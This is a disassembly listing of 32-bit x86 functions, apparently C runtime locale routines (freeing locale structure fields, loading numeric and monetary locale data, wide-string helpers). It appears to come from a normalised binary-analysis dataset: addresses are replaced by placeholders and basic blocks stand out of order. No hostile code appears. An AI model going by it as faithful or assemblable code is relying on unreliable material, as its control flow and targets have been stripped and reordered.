pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
mov eax [ esi + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
push eax
call sub_417912
pop ecx
sub_42b1fa
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x8 ]
xor eax eax
push esi
push edi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
cmp [ ebx + 0xb0 ] eax
jne r-xdata
xor esi esi
inc esi
push 0x50
push esi
mov [ ebp - 0x8 ] esi
call sub_41b887
pop ecx
pop ecx
mov [ ebp + 0x8 ] eax
test eax eax
jne r-xdata
cmp [ ebx + 0xac ] eax
jne r-xdata
mov esi [ ebx + 0x84 ]
push 0x14
pop ecx
mov edi eax
push 0x4
[ edi ] [ esi ]
call sub_41b8d1
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
mov edi eax
mov [ ebp - 0x4 ] eax
mov esi rw-data
jmp r-xdata
xor edi edi
mov [ eax ] edi
cmp [ ebx + 0xb0 ] edi
je r-xdata
push [ ebp + 0x8 ]
call sub_417912
xor eax eax
pop ecx
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x7c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
mov eax [ rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x8 ] eax
mov eax [ rw-data ]
mov [ esi + 0x30 ] eax
mov eax [ rw-data ]
mov [ esi + 0x34 ] eax
jmp r-xdata
push 0x4
call sub_41b8d1
pop ecx
mov [ ebp - 0xc ] eax
test eax eax
je r-xdata
cmp [ ebx + 0x78 ] 0x0
je r-xdata
push [ ebx + 0x7c ]
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
xor eax eax
inc eax
mov [ ecx ] eax
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_417912
mov ecx [ ebp - 0x4 ]
push ecx
call sub_417912
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
mov [ eax ] edi
mov edi [ ebx + 0xb0 ]
push 0xe
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_41f0bd
mov ecx [ ebp + 0x8 ]
add ecx 0x4
push ecx
push 0xf
push edi
mov esi eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
push 0x10
push edi
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x30
push eax
push 0xe
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add esp 0x50
add eax 0x34
push eax
push 0xf
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_41f0bd
add esp 0x14
or eax esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x78 ] eax
mov [ ebx + 0x7c ] edi
mov [ ebx + 0x84 ] esi
xor eax eax
push [ ebx + 0x78 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ edi ] eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
jmp r-xdata
push [ ebp + 0x8 ]
call sub_42b193
or [ ebp - 0x8 ] 0xffffffff
pop ecx
push [ ebx + 0x78 ]
call sub_417912
push [ ebx + 0x84 ]
call sub_417912
pop ecx
pop ecx
cmp [ edx ] 0x0
jne r-xdata
mov al [ edx ]
cmp al 0x30
jl r-xdata
mov edi [ ebp - 0xc ]
mov esi [ ebp + 0x8 ]
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc edx
mov esi edx
sub al 0x30
mov [ edx ] al
mov al [ esi + 0x1 ]
mov [ esi ] al
lea esi [ esi + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_42b402
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_417912
push [ esi + 0x8 ]
call sub_417912
push [ esi + 0xc ]
call sub_417912
push [ esi + 0x10 ]
call sub_417912
push [ esi + 0x14 ]
call sub_417912
push [ esi + 0x18 ]
call sub_417912
push [ esi ]
call sub_417912
push [ esi + 0x20 ]
call sub_417912
push [ esi + 0x24 ]
call sub_417912
push [ esi + 0x28 ]
call sub_417912
push [ esi + 0x2c ]
call sub_417912
push [ esi + 0x30 ]
call sub_417912
push [ esi + 0x34 ]
call sub_417912
push [ esi + 0x1c ]
call sub_417912
push [ esi + 0x38 ]
call sub_417912
push [ esi + 0x3c ]
call sub_417912
add esp 0x40
push [ esi + 0x40 ]
call sub_417912
push [ esi + 0x44 ]
call sub_417912
push [ esi + 0x48 ]
call sub_417912
push [ esi + 0x4c ]
call sub_417912
push [ esi + 0x50 ]
call sub_417912
push [ esi + 0x54 ]
call sub_417912
push [ esi + 0x58 ]
call sub_417912
push [ esi + 0x5c ]
call sub_417912
push [ esi + 0x60 ]
call sub_417912
push [ esi + 0x64 ]
call sub_417912
push [ esi + 0x68 ]
call sub_417912
push [ esi + 0x6c ]
call sub_417912
push [ esi + 0x70 ]
call sub_417912
push [ esi + 0x74 ]
call sub_417912
push [ esi + 0x78 ]
call sub_417912
push [ esi + 0x7c ]
call sub_417912
add esp 0x40
push [ esi + 0x80 ]
call sub_417912
push [ esi + 0x84 ]
call sub_417912
push [ esi + 0x88 ]
call sub_417912
push [ esi + 0x8c ]
call sub_417912
push [ esi + 0x90 ]
call sub_417912
push [ esi + 0x94 ]
call sub_417912
push [ esi + 0x98 ]
call sub_417912
push [ esi + 0x9c ]
call sub_417912
push [ esi + 0xa0 ]
call sub_417912
push [ esi + 0xa4 ]
call sub_417912
push [ esi + 0xa8 ]
call sub_417912
push [ esi + 0xb8 ]
call sub_417912
push [ esi + 0xbc ]
call sub_417912
push [ esi + 0xc0 ]
call sub_417912
push [ esi + 0xc4 ]
call sub_417912
push [ esi + 0xc8 ]
call sub_417912
add esp 0x40
push [ esi + 0xcc ]
call sub_417912
push [ esi + 0xb4 ]
call sub_417912
push [ esi + 0xd4 ]
call sub_417912
push [ esi + 0xd8 ]
call sub_417912
push [ esi + 0xdc ]
call sub_417912
push [ esi + 0xe0 ]
call sub_417912
push [ esi + 0xe4 ]
call sub_417912
push [ esi + 0xe8 ]
call sub_417912
push [ esi + 0xd0 ]
call sub_417912
push [ esi + 0xec ]
call sub_417912
push [ esi + 0xf0 ]
call sub_417912
push [ esi + 0xf4 ]
call sub_417912
push [ esi + 0xf8 ]
call sub_417912
push [ esi + 0xfc ]
call sub_417912
push [ esi + 0x100 ]
call sub_417912
push [ esi + 0x104 ]
call sub_417912
add esp 0x40
push [ esi + 0x108 ]
call sub_417912
push [ esi + 0x10c ]
call sub_417912
push [ esi + 0x110 ]
call sub_417912
push [ esi + 0x114 ]
call sub_417912
push [ esi + 0x118 ]
call sub_417912
push [ esi + 0x11c ]
call sub_417912
push [ esi + 0x120 ]
call sub_417912
push [ esi + 0x124 ]
call sub_417912
push [ esi + 0x128 ]
call sub_417912
push [ esi + 0x12c ]
call sub_417912
push [ esi + 0x130 ]
call sub_417912
push [ esi + 0x134 ]
call sub_417912
push [ esi + 0x138 ]
call sub_417912
push [ esi + 0x13c ]
call sub_417912
push [ esi + 0x140 ]
call sub_417912
push [ esi + 0x144 ]
call sub_417912
add esp 0x40
push [ esi + 0x148 ]
call sub_417912
push [ esi + 0x14c ]
call sub_417912
push [ esi + 0x150 ]
call sub_417912
push [ esi + 0x154 ]
call sub_417912
push [ esi + 0x158 ]
call sub_417912
push [ esi + 0x15c ]
call sub_417912
push [ esi + 0x160 ]
call sub_417912
add esp 0x1c
sub_42b782
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0xb4 ] 0x0
je r-xdata
mov esi rw-data
xor ebx ebx
push 0x164
inc ebx
push ebx
call sub_41b887
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov [ edi + 0x9c ] esi
xor eax eax
add eax 0xb0
push eax
call [ InterlockedDecrement@IAT ]
push edi
push esi
call sub_42b7fe
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov [ esi + 0xb0 ] ebx
jmp r-xdata
push esi
call sub_42b402
push esi
call sub_417912
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi + 0x9c ]
cmp eax rw-data
je r-xdata
sub_42b7fe
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov ebx [ esi + 0xb4 ]
test edi edi
jne r-xdata
push ebx
call sub_424cbe
and [ ebp - 0x4 ] 0x0
mov [ edi + 0x160 ] eax
lea eax [ edi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
mov [ ebp - 0x8 ] esi
call sub_41f0bd
lea ecx [ edi + 0x8 ]
push ecx
push 0x32
push ebx
mov esi eax
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
add esp 0x40
or esi eax
lea eax [ edi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
push edi
push 0x37
push ebx
or esi eax
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x24 ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x88 ]
push eax
push 0x40
push ebx
push 0x1
lea eax [ ebp - 0x8 ]
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xa0 ]
push eax
push 0x1f
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xa4 ]
push eax
push 0x20
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xa8 ]
push eax
push 0x1003
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0xac ]
push eax
push 0x1009
push ebx
lea eax [ ebp - 0x8 ]
push 0x0
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xb8 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xbc ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xc0 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0xc4 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xc8 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xcc ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xb4 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0xd4 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xd8 ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xdc ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xe0 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0xe4 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xe8 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xd0 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xec ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0xf0 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xf4 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xf8 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0xfc ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x100 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x104 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x108 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x10c ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x110 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x114 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x118 ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0x8 ]
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x11c ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x120 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x124 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x128 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x12c ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x130 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x134 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x138 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x13c ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x140 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x144 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x148 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x14c ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
add esp 0x50
or esi eax
lea eax [ edi + 0x150 ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x154 ]
push eax
push 0x1f
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x158 ]
push eax
push 0x20
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
lea eax [ edi + 0x15c ]
push eax
push 0x1003
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_41f0bd
add esp 0x50
or eax esi
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_42bfef
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx edi [ edx ]
movzx ecx [ esi ]
sub ecx edi
jne r-xdata
pop edi
pop esi
test ecx ecx
jns r-xdata
sub esi edx
jle r-xdata
or ecx 0xffffffff
jmp r-xdata
add edx 0x2
movzx edi [ edx ]
movzx ecx [ esi + edx ]
sub ecx edi
je r-xdata
mov eax ecx
pop ebp
retn
xor ecx ecx
inc ecx
test di di
je r-xdata
sub_42c02d
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
xor edx edx
push esi
push edi
mov eax ecx
cmp [ ecx ] dx
je r-xdata
pop edi
sub eax ecx
pop esi
sar eax 0x1
pop ebx
leave
retn
mov edi [ ebp + 0xc ]
movzx ebx [ edi ]
add eax 0x2
cmp [ eax ] dx
jne r-xdata
movzx ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov esi edi
test bx bx
je r-xdata
add esi 0x2
movzx edx [ esi ]
test dx dx
jne r-xdata
cmp dx [ ebp - 0x4 ]
je r-xdata
xor edx edx
sub_42c07c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
movzx ecx [ eax ]
push esi
push edi
test cx cx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
movzx ebx [ edi ]
add eax 0x2
movzx ecx [ eax ]
test cx cx
jne r-xdata
mov edx ebx
mov esi edi
test bx bx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
add esi 0x2
movzx edx [ esi ]
test dx dx
jne r-xdata
cmp dx cx
je r-xdata
sub_42c0be
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0xb0 ]
or [ esi + 0x8 ] 0x104
push 0x55
push eax
call sub_41e899
pop ecx
pop ecx
cmp eax 0x1
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4170bc
leave
retn
lea eax [ ebp - 0xb0 ]
push eax
call sub_41cd45
inc eax
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea eax [ esi + 0x250 ]
push 0x55
push eax
call sub_419c88
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41f421
int3
sub_42c135
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push [ esi ]
call sub_41cd45
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_41cd45
sub eax 0x3
neg eax
sbb eax eax
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
push [ esi ]
call sub_42c1f3
pop ecx
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test [ esi + 0x8 ] 0x200
je r-xdata
push 0x0
push 0x3
push sub_42c225
mov [ esi + 0xc ] eax
call sub_41e82d
add esp 0xc
test [ esi + 0x8 ] 0x100
je r-xdata
test [ esi + 0x8 ] 0x7
jne r-xdata
pop esi
pop ebp
retn
sub_42c1a9
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push [ esi ]
call sub_41cd45
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
push [ esi ]
call sub_42c1f3
pop ecx
push 0x2
pop eax
jmp r-xdata
pop esi
pop ebp
retn
and [ esi + 0x8 ] 0x0
push 0x0
push 0x3
push sub_42c443
mov [ esi + 0xc ] eax
call sub_41e82d
add esp 0xc
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_42c1f3
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
test ecx ecx
jne r-xdata
movzx eax [ ecx ]
add ecx 0x2
cmp ax 0x41
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0xffffff9f
cmp ax 0x19
ja r-xdata
cmp ax 0x5a
jbe r-xdata
mov eax edx
pop ebp
retn
inc edx
jmp r-xdata
sub_42c225
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x88 ] esi
call sub_4246d6
lea ebx [ eax + 0x9c ]
push 0x40
mov ecx [ ebx + 0x14 ]
neg ecx
sbb ecx ecx
lea eax [ ebp - 0x84 ]
and ecx 0xfffff005
push eax
add ecx 0x1002
push ecx
push esi
call sub_41e86a
add esp 0x10
test eax eax
jne r-xdata
push edi
lea eax [ ebp - 0x84 ]
push eax
push [ ebx + 0x4 ]
call sub_419a78
pop ecx
pop ecx
mov edi 0xfffff002
test eax eax
jne r-xdata
and [ ebx + 0x8 ] eax
inc eax
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov ecx 0x300
and eax ecx
cmp eax ecx
je r-xdata
push 0x40
lea eax [ ebp - 0x84 ]
push eax
mov eax [ ebx + 0x10 ]
neg eax
sbb eax eax
and eax edi
add eax 0x1001
push eax
push esi
call sub_41e86a
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn 0xc
mov eax [ ebx + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
mov ecx [ ebx + 0x10 ]
neg ecx
sbb ecx ecx
push 0x80
lea eax [ ebp - 0x84 ]
and ecx edi
push eax
add ecx 0x1001
push ecx
push esi
call sub_41e86a
add esp 0x10
test eax eax
jne r-xdata
and [ ebx + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
lea eax [ ebp - 0x84 ]
push eax
push [ ebx ]
call sub_419a78
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x84 ]
push eax
push [ ebx ]
call sub_419a78
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
test [ ebx + 0x8 ] 0x2
jne r-xdata
or [ ebx + 0x8 ] 0x304
or [ ebx + 0x8 ] 0x200
xor edi edi
cmp [ ebx + 0x10 ] edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] edi
je r-xdata
or [ ebx + 0x8 ] 0x100
cmp [ ebx + 0x250 ] di
jne r-xdata
test [ ebx + 0x8 ] 0x1
jne r-xdata
push [ ebx + 0xc ]
lea eax [ ebp - 0x84 ]
push eax
